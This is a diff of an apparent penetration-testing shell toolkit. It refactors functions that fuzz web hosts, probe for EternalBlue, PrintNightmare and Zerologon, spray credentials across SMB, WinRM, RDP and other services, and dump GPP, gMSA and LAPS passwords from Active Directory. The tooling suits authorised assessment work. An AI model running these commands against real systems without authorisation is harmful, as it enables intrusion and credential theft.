@@ -117,13 +117,11 @@ netscan() {
 #------------------------------------------------------------------------------------
 # Usage: webscan <IP/URL>
 webscan() {
-
     echo '
                 |    \033[1;33m  __|   __|    \     \ | \033[0m
  \ \  \ /  -_)   _ \ \033[1;33m\__ \  (      _ \   .  | \033[0m
   \_/\_/ \___| _.__/ \033[1;33m____/ \___| _/  _\ _|\_| \033[0m                                                                                 
 '  
-
 
     if [[ $# -eq 0 ]]; then
         echo -e "\033[1;31m[!] Missing parameters. \033[0m"
@@ -162,10 +160,6 @@ webscan() {
         return 1
     fi
 
-    # Parse domain and TLD
-    local domain=$(echo "$url" | sed 's|https*://||' | cut -d '.' -f 1)
-    local tld=$(echo "$url" | sed 's|https*://||' | cut -d '.' -f 2)
-
     # Check for required tools
     for tool in whatweb ffuf; do
         if ! command -v "$tool" &>/dev/null; then
@@ -173,7 +167,22 @@ webscan() {
             return 1
         fi
     done
-    
+
+    # Detect if target is IP or domain
+    local host=$(echo "$url" | sed 's|https*://||' | cut -d'/' -f1)
+    local is_ip=0
+    if [[ "$host" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+        is_ip=1
+    fi
+
+    # Parse domain and TLD (only if not IP)
+    local domain=""
+    local tld=""
+    if [[ $is_ip -eq 0 ]]; then
+        domain=$(echo "$host" | cut -d '.' -f 1)
+        tld=$(echo "$host" | cut -d '.' -f 2)
+    fi
+
     trap "echo ''" INT
 
     # Run WhatWeb
@@ -190,20 +199,25 @@ webscan() {
     ffuf -u "$url/FUZZ" -w "$weblist" -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "FUZZ:|-->"
     echo ""
 
-    # Subdomain Fuzzing
-    echo -e "\033[1;35m[!] Fuzzing for subdomains \033[0m"
-    echo -e "\033[0;34m[>] ffuf -u $url -w $weblist -H \"Host: FUZZ.$domain.$tld\" -c -t 250 -ic -ac -v \033[0m"
-    echo ""
-    ffuf -u "$url" -w "$weblist" -H "Host: FUZZ.$domain.$tld" -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "URL|-->"
-    echo -e "\033[0;36m[*] Remember to add any discovered subdomain to /etc/hosts :) \033[0m"
-    echo ""
+    if [[ $is_ip -eq 0 ]]; then
+        # Subdomain Fuzzing
+        echo -e "\033[1;35m[!] Fuzzing for subdomains \033[0m"
+        echo -e "\033[0;34m[>] ffuf -u $url -w $weblist -H \"Host: FUZZ.$domain.$tld\" -c -t 250 -ic -ac -v \033[0m"
+        echo ""
+        ffuf -u "$url" -w "$weblist" -H "Host: FUZZ.$domain.$tld" -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "URL|-->"
+        echo -e "\033[0;36m[*] Remember to add any discovered subdomain to /etc/hosts :) \033[0m"
+        echo ""
 
-    # Virtual Host Fuzzing
-    echo -e "\033[1;35m[!] Fuzzing for vhosts \033[0m"
-    echo -e "\033[0;34m[>] ffuf -u $url -w $weblist -H \"Host: FUZZ.$tld\" -c -t 250 -ic -ac -v \033[0m"
-    echo ""
-    ffuf -u "$url" -w "$weblist" -H "Host: FUZZ.$tld" -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "URL|-->"
-    echo ""
+        # Virtual Host Fuzzing
+        echo -e "\033[1;35m[!] Fuzzing for vhosts \033[0m"
+        echo -e "\033[0;34m[>] ffuf -u $url -w $weblist -H \"Host: FUZZ.$tld\" -c -t 250 -ic -ac -v \033[0m"
+        echo ""
+        ffuf -u "$url" -w "$weblist" -H "Host: FUZZ.$tld" -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "URL|-->"
+        echo ""
+    else
+        echo -e "\033[1;33m[!] Target is an IP. Skipping subdomain and vhost fuzzing. \033[0m"
+        echo ""
+    fi
 
     # Recursive Fuzzing for Common Extensions
     echo -e "\033[1;35m[!] Fuzzing recursively for common file extensions (this might take long!) \033[0m"
@@ -239,21 +253,21 @@ checkvulns() {
        
     echo "\033[1;35m[!] Checking for vulnerabilities \033[0m"
     echo '\033[0;34m[*] EternalBlue (MS17-010) \033[0m'
-    nxc smb $(echo "$nxc_auth") -M ms17-010 | grep MS17-010 | tr -s " " | cut -d " " -f 3-
+    nxc smb "${nxc_auth[@]}" -M ms17-010 #| grep MS17-010 | tr -s " " | cut -d " " -f 3-
     echo '\033[0;34m[*] PrintNightmare (CVE-2021-34527) \033[0m'
-    nxc smb $(echo "$nxc_auth") -M printnightmare | grep -i PRINT | tr -s " " | cut -d " " -f 5-
+    nxc smb "${nxc_auth[@]}" -M printnightmare | grep -i PRINT | tr -s " " | cut -d " " -f 5-
     #echo '\033[0;34m[*] SMBGhost \033[0m'
-    #nxc smb $(echo "$nxc_auth") -M smbghost | grep SMBGHOST | tr -s " " | cut -d " " -f 5-
+    #nxc smb "${nxc_auth[@]}" -M smbghost | grep SMBGHOST | tr -s " " | cut -d " " -f 5-
     echo '\033[0;34m[*] NoPac (CVE-2021-42278) \033[0m'
-    nxc smb $(echo "$nxc_auth") -M nopac | grep NOPAC | tr -s " " | cut -d " " -f 5- | tr -s '\n'
+    nxc smb "${nxc_auth[@]}" -M nopac | grep NOPAC | tr -s " " | cut -d " " -f 5- | tr -s '\n'
     echo '\033[0;34m[*] Coerce Attacks (CVE-2021-36942 / etc) \033[0m'
-    nxc smb $(echo "$nxc_auth") -M coerce_plus | grep COERCE | tr -s " " | cut -d " " -f 5- | tee coerce.tmp
+    nxc smb "${nxc_auth[@]}" -M coerce_plus | grep COERCE | tr -s " " | cut -d " " -f 5- | tee coerce.tmp
     if grep -q "VULNERABLE" coerce.tmp; then
-      echo "Try: nxc smb $(echo "$nxc_auth") -M coerce_plus -o LISTENER=$kali"
+      echo "Try: nxc smb "${nxc_auth[@]}" -M coerce_plus -o LISTENER=$kali"
     fi
     rm coerce.tmp 2>/dev/null
     echo '\033[0;34m[*] Zerologon (CVE-2020-1472) \033[0m'
-    nxc smb $(echo "$nxc_auth") -M zerologon | grep ZEROLOGON | tr -s " " | cut -d " " -f 5- | sed 's/[-]//g'
+    nxc smb "${nxc_auth[@]}" -M zerologon | grep ZEROLOGON | tr -s " " | cut -d " " -f 5- | sed 's/[-]//g'
     
     trap - INT
     echo "\033[1;31m[*] Done. \033[0m"
@@ -420,29 +434,29 @@ testcreds() {
         eval get_auth $line
 
         echo -e "\033[1;35m[!] Testing $user's credentials with NetExec\033[0m"
-        echo -e "\033[0;34m[>] nxc xxx $(echo "$nxc_auth") \033[0m"
+        echo -e "\033[0;34m[>] nxc xxx "${nxc_auth[@]}" \033[0m"
         
         echo -e '\033[0;34m[*] Trying SMB... \033[0m'
-        nxc smb $(echo "$nxc_auth") 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
-        nxc smb $(echo "$nxc_auth") --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "
+        nxc smb "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
+        nxc smb "${nxc_auth[@]}" --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "
         
         echo -e '\033[0;34m[*] Trying WinRM... \033[0m'
-        nxc winrm $(echo "$nxc_auth") 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
-        nxc winrm $(echo "$nxc_auth") --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "
+        nxc winrm "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
+        nxc winrm "${nxc_auth[@]}" --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "
 
         echo -e '\033[0;34m[*] Trying MS-SQL... \033[0m'
-        nxc mssql $(echo "$nxc_auth") 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
-        nxc mssql $(echo "$nxc_auth") --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "
+        nxc mssql "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
+        nxc mssql "${nxc_auth[@]}" --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "
 
         echo -e '\033[0;34m[*] Trying RDP... \033[0m'
-        nxc rdp $(echo "$nxc_auth") 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
-        nxc rdp $(echo "$nxc_auth") --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "
+        nxc rdp "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
+        nxc rdp "${nxc_auth[@]}" --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "
 
         echo -e '\033[0;34m[*] Trying SSH... \033[0m'
-        nxc ssh $(echo "$nxc_auth") 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
+        nxc ssh "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
         
         echo -e '\033[0;34m[*] Trying FTP... \033[0m'
-        nxc ftp $(echo "$nxc_auth") 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
+        nxc ftp "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
         
     done < auth.tmp
 
@@ -489,8 +503,8 @@ enumdomain() {
     read -s -q confirm
     if [[ $confirm =~ ^[Yy]$ ]]; then
         echo -e "\033[1;35m[!] Enumerating all users with RID Bruteforcing \033[0m"
-        echo -e "\033[0;34m[>] nxc smb $(echo "$nxc_auth") --rid-brute 5000 \033[0m"
-        nxc smb $(echo "$nxc_auth") --rid-brute 5000 2>/dev/null | grep SidTypeUser | cut -d ':' -f2 | cut -d '\' -f2 | cut -d ' ' -f1 | tee users.tmp
+        echo -e "\033[0;34m[>] nxc smb "${nxc_auth[@]}" --rid-brute 5000 \033[0m"
+        nxc smb "${nxc_auth[@]}" --rid-brute 5000 2>/dev/null | grep SidTypeUser | cut -d ':' -f2 | cut -d '\' -f2 | cut -d ' ' -f1 | tee users.tmp
         if [ -s users.tmp ]; then
             mv users.tmp users.list
             echo -e "\033[0;34m[*] Saving enumerated users to ./users.list \033[0m"
@@ -501,17 +515,17 @@ enumdomain() {
     fi
     
     echo "\033[1;35m[!] Enumerating groups \033[0m"
-    echo "\033[0;34m[>] nxc smb $(echo "$nxc_auth") --groups \033[0m"
-    nxc smb $(echo "$nxc_auth") --groups 2>/dev/null | grep 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -v 'membercount: 0' | sed "s/membercount:/-/g"   
+    echo "\033[0;34m[>] nxc smb "${nxc_auth[@]}" --groups \033[0m"
+    nxc smb "${nxc_auth[@]}" --groups 2>/dev/null | grep 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -v 'membercount: 0' | sed "s/membercount:/-/g"   
         
     
     echo "\033[1;35m[!] Enumerating privileged users \033[0m"
-    echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") --admin-count \033[0m"
-    nxc ldap $(echo "$nxc_auth") --admin-count 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5
+    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" --admin-count \033[0m"
+    nxc ldap "${nxc_auth[@]}" --admin-count 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5
     
     echo "\033[1;35m[!] Enumerating user descriptions \033[0m"
-    echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M user-desc \033[0m"
-    nxc ldap $(echo "$nxc_auth") -M user-desc 2>/dev/null | grep --color=never -o "User:.*"
+    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" -M user-desc \033[0m"
+    nxc ldap "${nxc_auth[@]}" -M user-desc 2>/dev/null | grep --color=never -o "User:.*"
     
     echo -e "\n\033[1;37m[\033[1;35m+\033[1;37m] Looking for exploitable accounts... \033[0m"
 
@@ -531,8 +545,8 @@ enumdomain() {
         echo -e '\033[0;34m[*] Saving hashes to ./kerb.hash \033[0m'
     fi
     echo "\033[1;35m[!] Searching for PASSWD_NOTREQD flag \033[0m" 
-    echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") --password-not-required \033[0m"
-    nxc ldap $(echo "$nxc_auth") --password-not-required 2>/dev/null | grep --color=never -ao "User:.*"
+    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" --password-not-required \033[0m"
+    nxc ldap "${nxc_auth[@]}" --password-not-required 2>/dev/null | grep --color=never -ao "User:.*"
     
     echo "\033[1;35m[!] Searching for pre-Win2k computer accounts\033[0m"
     echo "\033[0;34m[>] pre2k unauth -d $domain -dc-ip $dc_ip -inputfile users.list \033[0m"
@@ -554,16 +568,16 @@ enumdomain() {
     echo -e "\n\033[1;37m[\033[1;35m+\033[1;37m] Looking for interesting domain configuration and services... \033[0m"
 
     echo "\033[1;35m[!] Searching for PKI Enrollment Services \033[0m"
-    echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M adcs \033[0m"
-    nxc ldap $(echo "$nxc_auth") -M adcs 2>/dev/null | grep ADCS | tr -s " " | cut -d ' ' -f 6-
+    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" -M adcs \033[0m"
+    nxc ldap "${nxc_auth[@]}" -M adcs 2>/dev/null | grep ADCS | tr -s " " | cut -d ' ' -f 6-
     
     echo "\033[1;35m[!] Enumerating trust relationships \033[0m"
-    echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M enum_trusts \033[0m"
-    nxc ldap $(echo "$nxc_auth") -M enum_trusts 2>/dev/null | grep ENUM_TRUSTS | tr -s " " | cut -d ' ' -f 6-
+    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" -M enum_trusts \033[0m"
+    nxc ldap "${nxc_auth[@]}" -M enum_trusts 2>/dev/null | grep ENUM_TRUSTS | tr -s " " | cut -d ' ' -f 6-
     
     echo "\033[1;35m[!] Enumerating MachineAccountQuota \033[0m"
-    echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M maq \033[0m"
-    nxc ldap $(echo "$nxc_auth") -M maq 2>/dev/null | grep -oE "MachineAccountQuota: .*" --color=never
+    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" -M maq \033[0m"
+    nxc ldap "${nxc_auth[@]}" -M maq 2>/dev/null | grep -oE "MachineAccountQuota: .*" --color=never
     
     echo "\033[1;35m[!] Enumerating delegation rights \033[0m"
     echo "\033[0;34m[>] findDelegation.py $(echo "$imp_auth") \033[0m"
@@ -572,13 +586,13 @@ enumdomain() {
     echo "\033[1;35m[!] Enumerating DCSync rights \033[0m"  
     local domain1=$(echo $domain | cut -d '.' -f 1)
     local domain2=$(echo $domain | cut -d '.' -f 2)
-    echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth")  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync \033[0m"
-    nxc ldap $(echo "$nxc_auth")  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync 2>/dev/null | grep "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//'
+    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}"  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync \033[0m"
+    nxc ldap "${nxc_auth[@]}"  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync 2>/dev/null | grep "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//'
     
     echo "\033[1;35m[!] Searching for credentials in the GPO \033[0m"
-    echo "\033[0;34m[>] nxc smb $(echo "$nxc_auth") -M gpp_password -M gpp_autologin \033[0m"
-    nxc smb $(echo "$nxc_auth") -M gpp_password 2>/dev/null | grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never
-    nxc smb $(echo "$nxc_auth") -M gpp_autologin 2>/dev/null | grep -aioE "\Found credentials .*|Usernames: .*|Passwords: .*" --color=never
+    echo "\033[0;34m[>] nxc smb "${nxc_auth[@]}" -M gpp_password -M gpp_autologin \033[0m"
+    nxc smb "${nxc_auth[@]}" -M gpp_password 2>/dev/null | grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never
+    nxc smb "${nxc_auth[@]}" -M gpp_autologin 2>/dev/null | grep -aioE "\Found credentials .*|Usernames: .*|Passwords: .*" --color=never
         
     echo -e "\n\033[1;37m[\033[1;35m+\033[1;37m] Starting data collection... \033[0m"
 
@@ -628,22 +642,22 @@ enumuser() {
     #end debug
                                                    
     echo -e "\033[1;35m[!] Enumerating $user's groups \033[0m"
-    echo -e "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M groupmembership -o USER="$user" \033[0m"
-    nxc ldap $(echo "$nxc_auth") -M groupmembership -o USER="$user" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5-
+    echo -e "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" -M groupmembership -o USER="$user" \033[0m"
+    nxc ldap "${nxc_auth[@]}" -M groupmembership -o USER="$user" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5-
     
     echo "\033[1;35m[!] Trying to dump gMSA passwords with NetExec \033[0m"
-    echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") --gmsa \033[0m"
-    nxc ldap $(echo "$nxc_auth") --gmsa 2>/dev/null | grep -aoE "Account:.*" --color=never
+    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" --gmsa \033[0m"
+    nxc ldap "${nxc_auth[@]}" --gmsa 2>/dev/null | grep -aoE "Account:.*" --color=never
     
     echo "\033[1;35m[!] Trying to dump LAPS passwords with NetExec \033[0m"
-    echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M laps / --laps --dpapi \033[0m"
-    nxc ldap $(echo "$nxc_auth") -M laps 2>/dev/null  tail -n +4 | tr -s " " | cut -d " " -f 6-
-    nxc smb $(echo "$nxc_auth") --laps --dpapi 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 6-
+    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" -M laps / --laps --dpapi \033[0m"
+    nxc ldap "${nxc_auth[@]}" -M laps 2>/dev/null  tail -n +4 | tr -s " " | cut -d " " -f 6-
+    nxc smb "${nxc_auth[@]}" --laps --dpapi 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 6-
     
     
     echo "\033[1;35m[!] Trying to find KeePass files with NetExec \033[0m"
-    echo "\033[0;34m[>] nxc smb $(echo "$nxc_auth") -M keepass_discover \033[0m"
-    nxc smb $(echo "$nxc_auth") -M keepass_discover 2>/dev/null | grep -aoE "Found .*" --color=never
+    echo "\033[0;34m[>] nxc smb "${nxc_auth[@]}" -M keepass_discover \033[0m"
+    nxc smb "${nxc_auth[@]}" -M keepass_discover 2>/dev/null | grep -aoE "Found .*" --color=never
     
     trap - INT
     echo "\033[1;31m[*] Done. \033[0m"
@@ -803,7 +817,7 @@ enumsql() {
     stty sane
 
     while true; do
-        read -t 600 selected_tables < /dev/tty
+        read -e -t 600 selected_tables
         if [[ -z "$selected_tables" ]]; then
             echo -e "\033[1;35m[!] No input provided. Proceeding with default (all tables).\033[0m"
             cat "${TMP_PREFIX}_tables.txt" > "${TMP_PREFIX}_selected_tables.tmp"
@@ -843,7 +857,7 @@ enumsql() {
 
             echo -e "\033[1;36m[?] Enter the columns you are interested in (comma-separated / default: all): \033[0m"
             while true; do
-                read -t 600 selected_columns < /dev/tty
+                read -e -t 600 selected_columns 
                 if [[ -z "$selected_columns" ]]; then
                     echo -e "\033[1;35m[!] No input provided. Dumping all columns. \033[0m"
                     echo -e "\033[0;34m[>] sqlmap $@ -D $db -T $table --dump --batch \033[0m"
@@ -933,8 +947,7 @@ function color() {
 get_auth() {
     # Initialize variables
     local kerb=0
-    local target password hashes auth
-    #local nxc_auth imp_auth blood_auth
+    local target hashes auth user password
     #local dc_ip domain dc_fqdn
 
     # Parse arguments
@@ -974,6 +987,11 @@ get_auth() {
         shift
     done
 
+    # Após o parsing dos argumentos:
+    if [[ "$user" == "''" ]]; then user=""; fi
+    if [[ "$password" == "''" ]]; then password=""; fi
+
+
     # Validate mandatory parameters
     if [[ -z "$target" ]]; then
         echo -e "\033[1;31m[!] Target is required. Use --target or -t. \033[0m"
@@ -987,41 +1005,47 @@ get_auth() {
 
     # Sync date (optional, ensure `ntpdate` exists)
     if command -v ntpdate > /dev/null 2>&1; then
-        ntpdate "$dc_ip" > /dev/null 2>&1 #|| echo -e "\033[1;35m[!] Time sync failed. This is usually not a problem. \033[0m"
+        ntpdate "$dc_ip" > /dev/null 2>&1
     else
         echo -e "\033[1;35m[!] ntpdate not found. Skipping time sync.\033[0m"
     fi
 
-    # Build authentication strings
+    # Build authentication arrays
     case "$auth" in
         password)
-            nxc_auth="$target -u $user -p $password"
-            imp_auth="$domain/$user:$password -dc-ip $dc_ip"
+            nxc_auth=("$target" -u "$user" -p "$password")
+            imp_auth=("$domain/$user:$password" -dc-ip "$dc_ip")
             ;;
         hashes)
-            nxc_auth="$target -u $user -H $hashes"
-            imp_auth="$domain/$user -hashes :$hashes -dc-ip $dc_ip"
+            nxc_auth=("$target" -u "$user" -H "$hashes")
+            imp_auth=("$domain/$user" -hashes ":$hashes" -dc-ip "$dc_ip")
             ;;
         kerb)
-            nxc_auth="$target -u $user --use-kcache"
-            imp_auth="$domain/$user -k -dc-ip $dc_ip -dc-host $dc_fqdn"
+            nxc_auth=("$target" -u "$user" --use-kcache)
+            imp_auth=("$domain/$user" -k -dc-ip "$dc_ip" -dc-host "$dc_fqdn")
             ;;
         *)
-            nxc_auth="$target -u '' -p ''"
-            imp_auth="$domain/ -dc-ip $dc_ip"
+            nxc_auth=("$target" -u "" -p "")
+            imp_auth=("$domain/" -dc-ip "$dc_ip")
             ;;
     esac
 
     # Add Kerberos options if specified
     if [[ $kerb -eq 1 ]]; then
-        nxc_auth="$nxc_auth -k"
-        imp_auth="$imp_auth -k -dc-host $dc_fqdn"
+        nxc_auth+=(-k)
+        imp_auth+=(-k -dc-host "$dc_fqdn")
     fi
 
     # Extract bloodhound-compatible authentication
-    blood_auth=$(echo "$nxc_auth" | grep -oE "\-u.*")
+    blood_auth=$(printf "%s " "${nxc_auth[@]}" | grep -oE "\-u.*")
 
     # Export variables for further use
-    export user nxc_auth imp_auth blood_auth dc_ip domain dc_fqdn
+    export user
+    export nxc_auth
+    export imp_auth
+    export blood_auth
+    export dc_ip
+    export domain
+    export dc_fqdn
 }
 
